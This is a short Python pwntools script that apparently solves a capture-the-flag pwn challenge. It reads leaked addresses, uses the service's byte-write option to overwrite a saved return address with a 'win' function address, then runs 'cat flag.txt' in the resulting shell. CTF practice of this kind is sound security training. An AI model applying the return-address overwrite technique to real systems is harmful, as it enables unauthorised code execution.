from pwn import *

def solution(host: str, port: str) -> str:
    flag = ""
    context.update({"arch":"amd64","log_level":"error"})
    with remote(host, port) as rem:
        rem.recvuntil(b"Here's your address of choice (pun intended): ")
        choice_address = int(rem.recvline().decode().strip(), 16) # -no-pie
        choice_ret_address_distance = 0x8 + 0x14
        rem.recvuntil(b"You need to call the function at this address to win: ")
        win_address = int(rem.recvline().decode().strip(), 16)
        for i in range(8):
            rem.recvuntil(b"> ")
            rem.sendline(b"2")
            rem.recvuntil(b"Enter the address of the byte you want to write to in hex:\n")
            rem.sendline(hex(choice_address + choice_ret_address_distance + i).encode())
            rem.recvuntil(b"Enter the byte you want to change it to:\n")
            rem.sendline(hex(p64(win_address)[i]).encode())
        rem.recvuntil(b"> ")
        rem.sendline(b"3")
        rem.recvuntil(b"Invalid option! Exiting...")
        rem.sendline(b"cat flag.txt")
        flag = rem.recvall(timeout = 1).decode().strip()
    return flag

if __name__ == "__main__":
    host = "challs.nusgreyhats.org"
    port = "33021"
    print(solution(host, port))
    